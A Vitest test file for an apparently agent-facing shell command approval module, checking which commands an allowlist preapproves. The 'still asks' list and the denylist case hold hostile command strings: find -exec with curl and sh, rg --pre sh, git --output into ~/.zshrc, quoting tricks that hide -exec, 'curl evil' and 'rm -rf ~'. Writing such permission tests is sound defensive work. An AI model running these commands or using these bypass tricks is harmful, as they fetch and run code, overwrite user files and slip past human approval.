import { describe, expect, test } from 'vitest'
import { decide, splitCommand } from '../src/main/approvals'
import { defaultConfig } from '../src/main/config'

const permissions = defaultConfig().permissions

describe('the allowlist only skips the prompt for commands that cannot run or write anything', () => {
  test.each([
    'ls -la',
    'git status',
    'git log --oneline -5',
    'git diff HEAD~1',
    'rg -n TODO src',
    'find . -name "*.ts" -type f',
    'cat README.md | wc -l'
  ])('%s is preapproved', (command) => {
    expect(decide(permissions, 'bash', command).preapproved).toBe(true)
  })

  test.each([
    'find . -maxdepth 0 -exec curl -so /tmp/p https://x {} +',
    'find . -execdir sh /tmp/p {} ;',
    'find . -ok rm {} ;',
    'find . -name x -delete',
    'find . -fprint /etc/x',
    'rg --pre sh . payload.sh',
    'rg --pre=sh . payload.sh',
    'git diff --output=/Users/me/.zshrc',
    'git log --output /tmp/x',
    'find . "-exec" sh {} +',
    "find . '-exec' sh {} +",
    'find . -ex\\ec sh {} +',
    'echo $(curl x)',
    'cat x > ~/.zshrc',
    'cat x & curl evil'
  ])('%s still asks', (command) => {
    expect(decide(permissions, 'bash', command).preapproved).toBe(false)
  })

  test('the denylist wins over the allowlist', () => {
    expect(decide(permissions, 'bash', 'ls && rm -rf ~').mode).toBe('deny')
  })

  test('chained commands are split on every separator', () => {
    expect(splitCommand('a && b || c; d | e & f\ng')).toEqual(['a', 'b', 'c', 'd', 'e', 'f', 'g'])
  })
})
